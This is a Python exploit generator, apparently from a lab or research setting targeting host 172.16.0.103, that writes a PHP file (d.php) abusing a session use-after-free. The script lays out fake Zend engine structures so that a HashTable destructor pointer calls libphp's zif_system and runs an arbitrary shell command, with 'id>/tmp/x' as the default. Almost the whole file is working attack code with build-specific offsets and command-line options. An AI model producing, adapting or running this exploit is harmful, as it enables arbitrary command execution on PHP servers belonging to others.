#!/usr/bin/env python3
"""Zend-only payload generator (172.16.0.103 line).

Generates a static d.php whose pDestructor is libphp's zif_system. Unlike the
libc-system baseline this needs no libc address; it needs S (the freed arData
allocation) and the libphp base only.

Layout (offsets inside the 320-byte buffer at S):
  0x40  fake zend_function: type=ZEND_INTERNAL_FUNCTION(1), fn_flags=0
  0x60  fake zval -> fake HashTable at S+0x80, type IS_ARRAY_EX
  0x80  fake HashTable (flags=STATIC_KEYS, mask=0xfffffff8, arData=S+0xA0)
  0xA0  fake zend_execute_data
  0xB0  execute_data->return_value == fake HT.pDestructor == zif_system
  0xB8  execute_data->func = S+0x40
  0xCC  num_args = 1
  0xF0  arg1 zval -> fake zend_string at S+0x100
  0x100 fake zend_string header; chars "id>/tmp/x" at S+0x118
  0x138+ observed clobbered by the allocator; keep unused.

Usage:
  mkpayload_zend_103.py --s 0x7f...4640 --libphp 0x7f...0000 --out d.php
"""
import argparse
import struct

ZIF_SYSTEM_OFF = 0x43A870  # libphp.so, this build


def q(v):
    return struct.pack("<Q", v & 0xFFFFFFFFFFFFFFFF)


def d(v):
    return struct.pack("<I", v & 0xFFFFFFFF)


def build(S, zif_system, cmd="id>/tmp/x"):
    p = bytearray(320)
    # fake zend_function
    p[0x40:0x44] = d(1)          # ZEND_INTERNAL_FUNCTION
    p[0x44:0x48] = d(0)          # fn_flags
    # fake zval (bucket 1)
    p[0x60:0x68] = q(S + 0x80)
    p[0x68:0x6C] = d(0x307)      # IS_ARRAY_EX
    # fake HashTable
    p[0x80:0x84] = d(1)          # refcount
    p[0x84:0x88] = d(7)          # IS_ARRAY
    p[0x88:0x8C] = d(0x10)       # HASH_FLAG_STATIC_KEYS
    p[0x8C:0x90] = d(0xFFFFFFF8) # nTableMask
    p[0x90:0x98] = q(S + 0xA0)   # arData
    p[0x98:0x9C] = d(1)          # nNumUsed
    p[0x9C:0xA0] = d(1)          # nNumOfElements
    p[0xB0:0xB8] = q(zif_system) # pDestructor / return_value
    # fake execute_data
    p[0xB8:0xC0] = q(S + 0x40)   # func
    p[0xCC:0xD0] = d(1)          # This.u2.num_args
    # arg1 at execute_data + 0x50
    p[0xF0:0xF8] = q(S + 0x100)
    p[0xF8:0xFC] = d(6)          # IS_STRING
    # fake zend_string
    p[0x100:0x104] = d(1)        # refcount
    p[0x104:0x108] = d(0x106)    # IS_STRING_EX
    p[0x108:0x110] = q(0)        # h
    p[0x110:0x118] = q(len(cmd)) # len
    p[0x118:0x118 + len(cmd)] = cmd.encode()
    p[0x118 + len(cmd)] = 0
    assert 0x118 + len(cmd) <= 0x138, "keep the command below S+0x138"
    return bytes(p)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--s", type=lambda x: int(x, 0), required=True)
    ap.add_argument("--libphp", type=lambda x: int(x, 0), required=True)
    ap.add_argument("--cmd", default="id>/tmp/x")
    ap.add_argument("--out", required=True)
    args = ap.parse_args()
    payload = build(args.s, args.libphp + ZIF_SYSTEM_OFF, args.cmd)
    php = """<?php
$payload = hex2bin("%s");
$fp = fopen("php://memory", "w");
class X {
    public $fp, $payload, $keep = [];
    function __construct($fp, $payload) { $this->fp = $fp; $this->payload = $payload; }
    function __destruct() {
        $_SESSION["pwn"] = "x";
        $this->keep[] = stream_bucket_new($this->fp, $this->payload);
    }
}
session_start();
$_SESSION["x"] = new X($fp, $payload);
for ($i = 0; $i < 7; $i++) { $_SESSION["k".$i] = "v"; }
session_unset();
echo "AFTER\\n";
""" % payload.hex()
    open(args.out, "w").write(php)
    print("wrote", args.out, "zif_system=0x%x" % (args.libphp + ZIF_SYSTEM_OFF))


if __name__ == "__main__":
    main()
